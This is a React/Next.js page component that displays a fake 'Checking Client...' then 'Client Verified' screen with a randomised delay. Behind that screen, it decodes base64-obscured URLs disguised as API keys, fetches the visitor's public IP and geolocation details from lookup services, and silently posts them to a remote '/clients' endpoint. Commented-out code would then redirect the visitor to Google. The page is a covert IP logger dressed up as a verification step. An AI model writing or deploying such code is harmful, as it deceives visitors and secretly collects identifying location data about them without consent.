import React from "react";
import axios from "axios";
import { useEffect, useState } from "react";
import { useRouter } from "next/router";
import { redirect } from "next/dist/server/api-utils";
import CheckBoxRoundedIcon from "@mui/icons-material/CheckBoxRounded";
import { Box, Button, Typography, CircularProgress, Grid } from "@mui/material";
import { motion } from "framer-motion";

function Ip() {
  const [loaded, setLoaded] = useState(
    <Box>
      <Typography>Checking Client...</Typography>
      <br />
      <CircularProgress size={100} />
    </Box>
  );

  // const [chars, setChars] = useState({
  //   a: "x",
  //   b: "y",
  //   c: "z",
  //   w: "p",
  //   v: "t",
  //   n: "k",
  //   o: "i",
  // });
  // const [chars2, setChars2] = useState({
  //   H: "A",
  //   R: "P",
  //   L: "Z",
  //   F: "G",
  //   D: "T",
  //   W: "M",
  //   S: "R",
  // });
  // const [s, setS] = useState("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u");
  // const [p, setP] = useState(s.replace(/[abcwvno]/g, (m) => chars[m]));
  // const [g, setG] = useState(p.replace(/[HRLFDWS]/g, (m) => chars2[m]));
  // console.log("convert " + g);

  // const [buff2, setBuff2] = useState(new Buffer.from(apikey2, "base64"));
  // const [buff3, setBuff3] = useState(new Buffer.from(userToken, "base64"));
  // const [text2, setText2] = useState(buff2.toString("utf-8"));
  // const [theDate, setTheDate] = useState(buff3.toString("utf-8"));

  const [apikey, setApikey] = useState(
    "aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u"
  );
  const [buff, setBuff] = useState(new Buffer.from(apikey, "base64"));
  const [cl, setCl] = useState(buff.toString("utf-8"));

  const [apikey2, setApikey2] = useState("aHR0cHM6Ly9pcHdoby5pcy8=");
  const [buff2, setBuff2] = useState(new Buffer.from(apikey2, "base64"));
  const [cl2, setCl2] = useState(buff2.toString("utf-8"));

  const [info, setInfo] = useState();
  const [anew, asetNew] = useState();

  useEffect(() => {
    const callAPI = async () => {
      try {
        const res = await fetch(cl);
        const data = await res.json();
        setInfo(data);
      } catch (err) {}
    };
    callAPI();
  }, []);
  useEffect(() => {
    if (!info) return;
    const callAPI2 = async () => {
      try {
        const res = await fetch(cl2 + info.ip);
        const data = await res.json();
        asetNew(data);
      } catch (err) {}
    };
    callAPI2();
  }, [info]);

  useEffect(() => {
    if (!anew) return;
    const create = async () => {
      await axios
        .post(`${process.env.NEXT_PUBLIC_AWS_API}` + "/clients", {
          data: {
            user: anew,
            time: anew.ip,
          },
        })
        .then((response) => {});
    };
    create();
  }, [anew]);

  // useEffect(() => {
  //   setTimeout(() => {
  //     redirect();
  //   }, randomInt(2400, 2800));
  // }, []);

  useEffect(() => {
    setTimeout(() => {
      setLoaded(
        <motion.div
          initial={{ opacity: 0, scale: 0.5 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{
            type: "spring",
            stiffness: 100,
            damping: 30,
          }}
        >
          <Box>
            <Typography>Client Verified</Typography>
            <br />
            <CheckBoxRoundedIcon color={"success"} sx={{ fontSize: 100 }} />
          </Box>
        </motion.div>
      );
    }, randomInt(1200, 1600));
  }, []);

  function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
  }

  // const redirect = async () => {
  //   try {
  //     router.push("https://www.google.com");
  //   } catch (err) {}
  // };

  return (
    <div>
      <Box sx={{ mt: "33vh" }}>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{
            type: "spring",
            stiffness: 100,
            damping: 30,
          }}
        >
          {loaded}
        </motion.div>
      </Box>
    </div>
  );
}

export default Ip;
